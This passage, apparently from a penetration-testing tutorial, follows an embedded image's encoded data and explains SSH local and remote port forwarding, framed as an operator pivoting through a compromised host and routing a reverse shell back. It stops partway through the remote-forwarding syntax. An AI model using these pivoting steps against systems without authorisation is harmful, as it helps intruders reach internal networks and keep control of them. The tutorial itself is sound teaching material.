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vrmrefuSXPydWAQu2QXbLgD5abm4kDsbiHLfHxcWcsetfGDiG+z2711mxw1osF2b1vmw1C5Nrenqq7+fb/bCcrPHnzC79bbsN6kPG+ZHswhLAAD0DhUTmP5w56/tzW98vQs3NblwVKhkNO6U+8SbwpALLgpErh63PiC5baa21mp3Ndm/vO8dtvr+O23Oty63iW84y+WcTgYdLg0AAECvVjFJ4PDDR9rtP/uJPXTvXXbAvvu0CUq56zC5sJMbNdIUm9v6kaRYwtTbroaNtu3Zh+2A7S/b9y7/sg0aODDcEwAAQOdU3NDJEUccbk888hf7jx981/YdvE9o1exZ9jLxLi7lRpCyV/bOBiQFp8GDBtlbTjveti19whpffM6sOX6nCQAAQNdV5FzT3nsPsvM//H57Yclj9rEpH7SBe+0Vjjg17iErJIVpubp+fe0NZ55u1359uq15+iE784RjLLOzMXQGAADYfRW9OKeurs6u+7drbMnjf7VR9YdkG2uzI0w1tbV23jveapuXLbYFt//UPv7PU7LHAQAASqyiA1O0/3772RN/u98eWfQHu/7/fdce+vMCe/n5p+22n8yxWhZkAwCAMquqtDFm9FE29WMX2AmvPc4G79OyvgkAAKCcGJ4BAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABIQWACAABI0eMC0ymnnNKm5Ms/fvLJJ4cjAAAAbdVknFAHAABAAUzJAQAApCAwAQAApCAwAQAApCAwAQAApCAwAQAApCAwAQAApOi2ywq8+OKLdv3119uvf/1re+mll6y5uTkc6Zlqa2vtkEMOsXPPPdc+9alP2aGHHhqOAACAatMtgempp56yU0891QYNGmRvfOMb/cUia2pqwtGeSU/rI488Yn/+85+toaHBHn74YTv22GPDUQAAUE3KHpiampps2LBhtt9++9k//vEP69OnTzjSO+zatcuOPvpo27Bhg61atcr69+8fjgAAgGpR9jVM8+fPt8bGRvvrX//a68KS6GfWz67n4JZbbgmtAACgmpR9hGnmzJn2pz/9yZfutnLlSnv22Wdt9erVfqRn+PDhduSRR9oRRxwRenQfTUXq/m+77bbQAgAAqkXZR5jWrl1rBx10UNgrvzVr1tj3v/99O/30023kyJF29tln24UXXmgXXXSRTZw40Y466ig77rjj7Morr7SlS5eGW5WfpiUV4HqKBQsW+HVosYwYMSIcAQCg5yl7YNLITncs8N6+fbtdd911fhTna1/7ml87pU/lvfDCC7Zjxw5f9Ok8TYvtu+++9r3vfc+PNM2YMcMvyi43PQc7d+4Me+2bM2dOqyASi9oBAMCe0SOuw7Ru3To7+eST7dOf/rR97GMfs1deecUeffRRu/jii/3Ihz7ir9Bx8MEH2+TJk23RokV+JGr69On2rW99y0aPHm3Lli0LZ0MxNFqn2VyV+vr60AoAQM9U9YHp//7v/+ykk06yzZs3+8XV//mf/2kDBgwIR9unT6tdddVV9sQTT9jgwYPttNNOswcffDAc3XOmTp3qQ8js2bP9vhbNa1/tHckfkWpPfr84tbZkyZLQo20flXJJTu0p3OaPsOWPrE2ZMiV3THU97rjf3rRgPB5LUv7Uou4v/zGoj0Yik22637THCgDoOao6MGmUSGuUdMmC++67z84444xwpHjHHHOMv+1rXvMae+c73+mvGVVN4pt2PrXpjT6KwSLfpEmTQi1LwaCQQrcttRUrVti0adPCXpb223tM8+bNs7Fjx4a97O2TfYt9bgAASJUps4svvjjzwQ9+MOyVzq5duzJnnnlm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)

`ssh -L 1337:10.0.0.2:80 root@10.0.0.1` 

* Proxy traffic to 10.0.0.2:80 on local port 1337 by creating a proxy on 10.0.0.1 

### Remote port forwarding 

Here our operator managed to get SSH access to the same host we saw in the previous example, but this time he needs the server to route a reverse shell he executed on the target back to himself.  

The syntax to make this happen is the following: 

`ssh -R sshGatewayIp:sshGatewayPort:localIp:localPort user@sshGateway` 

With: 

* **-R** being the option to instruct SSH to instantiate a remote port forwarding tunnel 
* **sshGatewayIp** being the IP address of the SSH server that will route the traffic 
* **sshGatewayPort** being the port of the SSH server that will receive the traffic that needs to be routed 
